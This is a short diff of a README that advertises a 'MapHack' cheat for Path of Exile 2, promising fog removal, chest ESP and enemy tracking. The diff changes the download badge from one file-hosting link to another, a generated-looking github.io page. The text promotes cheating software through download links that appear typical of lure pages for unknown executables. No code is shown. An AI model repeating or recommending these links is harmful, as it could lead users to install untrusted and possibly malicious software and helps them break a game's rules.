@@ -6,7 +6,7 @@ In **Path of Exile 2**, exploring maps can feel like crawling through a foggy ma
 
 It lifts the fog, exposes every secret, and gives you full vision of the layout—before you even take a step. Add **chest ESP**, **enemy location tracking**, and **rare marker reveals**, and you've got the ultimate loot navigator.
 
-[![Download MapHack](https://img.shields.io/badge/Download-MapHack-blueviolet)](https://fileoffload9.bitbucket.io)
+[![Download MapHack](https://img.shields.io/badge/Download-MapHack-blueviolet)](https://Path-of-Exile-2-MapHack-cywof.github.io/.github)
 ---
 
 ## 🧰 Product Description
